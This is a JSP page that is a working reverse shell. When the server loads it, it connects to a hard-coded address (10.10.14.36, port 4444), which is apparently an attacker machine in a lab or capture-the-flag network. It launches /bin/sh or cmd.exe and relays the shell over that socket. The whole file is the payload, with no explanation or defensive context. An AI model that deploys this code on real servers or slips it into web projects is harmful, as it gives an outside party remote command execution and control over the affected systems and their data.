<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream oj;
    OutputStream eh;

    StreamConnector( InputStream oj, OutputStream eh )
    {
      this.oj = oj;
      this.eh = eh;
    }

    public void run()
    {
      BufferedReader kg  = null;
      BufferedWriter sjc = null;
      try
      {
        kg  = new BufferedReader( new InputStreamReader( this.oj ) );
        sjc = new BufferedWriter( new OutputStreamWriter( this.eh ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = kg.read( buffer, 0, buffer.length ) ) > 0 )
        {
          sjc.write( buffer, 0, length );
          sjc.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( kg != null )
          kg.close();
        if( sjc != null )
          sjc.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.36", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
